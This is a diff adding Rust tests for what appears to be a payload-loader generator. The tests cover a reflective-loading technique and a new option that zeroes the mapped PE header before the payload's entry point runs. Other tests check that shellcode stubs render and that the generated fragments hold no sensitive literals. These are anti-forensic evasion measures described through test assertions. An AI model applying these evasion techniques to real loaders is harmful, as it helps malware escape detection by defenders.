@@ -21,6 +21,38 @@ fn parses_params_from_empty_yaml() {
     );
 }
 
+/// The option is opt-in: a plan that does not mention it keeps the mapped
+/// header intact.
+#[test]
+fn erase_header_defaults_to_off() {
+    assert!(!Params::default().erase_header);
+
+    let step: TechniqueKind = serde_yml::from_str("technique: reflective_loading\nparams: {}\n")
+        .expect("an empty params mapping should parse");
+    assert_eq!(
+        step,
+        TechniqueKind::ReflectiveLoading {
+            params: Params::default()
+        }
+    );
+}
+
+#[test]
+fn parses_erase_header_from_params() {
+    let step: TechniqueKind =
+        serde_yml::from_str("technique: reflective_loading\nparams:\n  erase_header: true\n")
+            .expect("reflective_loading should parse");
+    assert_eq!(
+        step,
+        TechniqueKind::ReflectiveLoading {
+            params: Params {
+                erase_header: true,
+                ..Params::default()
+            }
+        }
+    );
+}
+
 #[test]
 fn def_is_well_formed() {
     assert_eq!(DEF.name, "reflective_loading");
@@ -28,6 +60,11 @@ fn def_is_well_formed() {
     assert!(!DEF.stub_fragment.is_empty());
     assert!(SHELLCODE_FRAGMENT.contains("fn run_shellcode"));
     assert!(!DEF.readme.is_empty());
+    assert!(
+        serde_yml::from_str::<TechniqueKind>(DEF.params_example).is_ok(),
+        "params_example must parse as a runtime step: {}",
+        DEF.params_example
+    );
 }
 
 #[test]
@@ -62,6 +99,63 @@ fn the_payload_format_selects_the_fragment() {
     let shellcode = params.render_fragment_for(&strings, PayloadFormat::Shellcode, None);
     assert!(shellcode.contains("fn run_shellcode"));
     assert!(!shellcode.contains("fn run_reflective"));
+}
+
+/// The flag reaches the fragment as a `true`/`false` constant: off keeps the
+/// mapped header, on enables the zeroing.
+#[test]
+fn the_rendered_fragment_carries_the_erase_header_flag() {
+    let strings = StringsConfig::from_yaml(None).expect("default strings");
+
+    let off = Params::default().render_fragment(&strings);
+    assert!(off.contains("const ERASE_HEADER: bool = false;"));
+    assert!(off.contains("fn erase_mapped_header"));
+
+    let on = Params {
+        erase_header: true,
+        ..Params::default()
+    }
+    .render_fragment(&strings);
+    assert!(on.contains("const ERASE_HEADER: bool = true;"));
+}
+
+/// The zeroing writes `SizeOfHeaders` zero bytes at the mapped base, after the
+/// loader's fixups and before the payload's entry point runs.
+#[test]
+fn erase_header_zeroes_the_mapped_header_before_the_entry_point() {
+    let strings = StringsConfig::from_yaml(None).expect("default strings");
+    let fragment = Params {
+        erase_header: true,
+        ..Params::default()
+    }
+    .render_fragment(&strings);
+
+    assert!(fragment.contains("(*nt).OptionalHeader.SizeOfHeaders as usize"));
+    assert!(fragment.contains("ptr::write_bytes(image_base as *mut u8, 0, size)"));
+    let erase = fragment
+        .find("erase_mapped_header(image_base, nt);")
+        .expect("the enabled fragment must erase the mapped header");
+    let entry = fragment
+        .find("exe_main()")
+        .expect("the mapper must call the payload's entry point");
+    assert!(
+        erase < entry,
+        "the header must be erased before the payload's entry point runs"
+    );
+}
+
+/// A shellcode payload has no mapped image, so enabling the option changes
+/// nothing in its fragment.
+#[test]
+fn erase_header_does_not_change_the_shellcode_fragment() {
+    let strings = StringsConfig::from_yaml(None).expect("default strings");
+    let plain = Params::default().render_fragment_for(&strings, PayloadFormat::Shellcode, None);
+    let enabled = Params {
+        erase_header: true,
+        ..Params::default()
+    }
+    .render_fragment_for(&strings, PayloadFormat::Shellcode, None);
+    assert_eq!(plain, enabled);
 }
 
 /// Every rendered fragment must be free of unsubstituted `$PLACEHOLDER$`
@@ -110,21 +204,27 @@ fn rendered_fragments_have_no_placeholders_or_sensitive_literals() {
     ];
 
     for strings in strategies {
-        for format in [
-            PayloadFormat::Pe,
-            PayloadFormat::Dll,
-            PayloadFormat::Shellcode,
-        ] {
-            let fragment = Params::default().render_fragment_for(&strings, format, None);
-            assert!(
-                !fragment.contains('$'),
-                "an unsubstituted placeholder would break the stub ({format:?})"
-            );
-            let leaked = find_sensitive_literals_in_source(&fragment);
-            assert!(
-                leaked.is_empty(),
-                "the rendered fragment leaks sensitive literals ({format:?}): {leaked:?}"
-            );
+        for erase_header in [false, true] {
+            for format in [
+                PayloadFormat::Pe,
+                PayloadFormat::Dll,
+                PayloadFormat::Shellcode,
+            ] {
+                let params = Params {
+                    erase_header,
+                    ..Params::default()
+                };
+                let fragment = params.render_fragment_for(&strings, format, None);
+                assert!(
+                    !fragment.contains('$'),
+                    "an unsubstituted placeholder would break the stub ({format:?})"
+                );
+                let leaked = find_sensitive_literals_in_source(&fragment);
+                assert!(
+                    leaked.is_empty(),
+                    "the rendered fragment leaks sensitive literals ({format:?}): {leaked:?}"
+                );
+            }
         }
     }
 }
